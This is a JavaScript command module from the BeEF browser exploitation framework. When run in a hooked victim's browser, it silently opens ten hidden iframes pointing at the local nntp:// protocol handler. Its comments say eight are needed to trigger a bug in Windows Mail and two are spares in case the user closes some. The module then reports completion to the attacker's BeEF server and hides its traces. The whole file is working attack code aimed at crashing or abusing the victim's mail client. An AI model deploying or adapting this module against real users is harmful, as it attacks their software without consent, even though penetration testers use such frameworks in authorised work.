//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
beef.execute(function() {

	// container iframe
	var winmail_container = document.createElement('iframe');
	winmail_container.setAttribute('id',    'winmail');
	winmail_container.setAttribute('style', 'display:none');
	document.body.appendChild(winmail_container);

	// initiate 10 nntp connections
	// 8 to trigger bug + 2 in case the user manages to close some
	var protocol_iframe;
	for(var i=1;i<=10;i++) {
		protocol_iframe = document.createElement('iframe');
		protocol_iframe.setAttribute('src',   'nntp://127.0.0.1:119//');
		protocol_iframe.setAttribute('id',    'winmail'+i);
		protocol_iframe.setAttribute('style', 'display:none');
		winmail_container.contentWindow.document.body.appendChild(protocol_iframe);
	}

	beef.net.send("<%= @command_url %>", <%= @command_id %>, "complete");

	document.body.removeChild(document.getElementById('winmail'));

});
